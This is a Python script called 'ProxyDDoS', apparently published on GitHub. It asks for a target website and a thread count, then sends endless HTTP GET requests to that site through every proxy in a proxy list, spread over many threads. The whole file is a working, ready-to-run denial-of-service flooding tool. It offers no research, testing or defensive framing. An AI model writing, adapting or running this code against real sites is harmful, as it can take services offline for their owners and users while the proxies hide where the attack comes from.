import socket
import threading
import requests
from pystyle import Anime, Colors, Colorate
import sys

sys.stdout.write("\x1b]2;ProxyDDoS\x07")

class bcolors:
    PURPLE2 = '\033[1;35m'
    ENDC = '\033[0m'

def startlogo():
    logo = """

 ________  __                                            __  __  __                     
/        |/  |                                          /  |/  |/  |                    
$$$$$$$$/ $$ |____    ______    ______    ______    ____$$ |$$ |$$/  _______    ______  
   $$ |   $$      \  /      \  /      \  /      \  /    $$ |$$ |/  |/       \  /      \ 
   $$ |   $$$$$$$  |/$$$$$$  |/$$$$$$  | $$$$$$  |/$$$$$$$ |$$ |$$ |$$$$$$$  |/$$$$$$  |
   $$ |   $$ |  $$ |$$ |  $$/ $$    $$ | /    $$ |$$ |  $$ |$$ |$$ |$$ |  $$ |$$    $$ |
   $$ |   $$ |  $$ |$$ |      $$$$$$$$/ /$$$$$$$ |$$ \__$$ |$$ |$$ |$$ |  $$ |$$$$$$$$/ 
   $$ |   $$ |  $$ |$$ |      $$       |$$    $$ |$$    $$ |$$ |$$ |$$ |  $$ |$$       |
   $$/    $$/   $$/ $$/        $$$$$$$/  $$$$$$$/  $$$$$$$/ $$/ $$/ $$/   $$/  $$$$$$$/ 
                                                                                        
                                                                                        
                                                                                       
        Github: https://github.com/Threadlinee

[$] Start System...
"""
    Anime.Fade((logo), Colors.blue_to_purple, Colorate.Vertical, time=2)

def flood_request(proxy, target_url):
    while True:
        try:
            proxies = {
                "http": f"http://{proxy}",
                "https": f"http://{proxy}",
            }
            response = requests.get(target_url, proxies=proxies, timeout=5)
            if response.status_code == 200:
                print(f"[+] Request sent via {proxy}")
            else:
                print(f"[!] Failed to send request via {proxy}, status code: {response.status_code}")
        except requests.RequestException as e:
            print(f"[!] Error with proxy {proxy}: {e}")

def setup():
    target_url = input(f"{bcolors.PURPLE2}[$] Enter the target website URL: {bcolors.ENDC}")

    try:
        with open('proxys.txt', 'r') as file:
            proxies_list = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print("proxys.txt not found.")
        return

    threads = int(input(f"{bcolors.PURPLE2}[$] Number of threads to use: {bcolors.ENDC}"))

    print(f"\n[✓] Flooding {target_url} with {threads} threads using proxies...\n")

    for proxy in proxies_list:
        for _ in range(threads):
            thread = threading.Thread(target=flood_request, args=(proxy, target_url))
            thread.daemon = True
            thread.start()

    while True:
        pass

def startup():
    startlogo()
    setup()

startup()
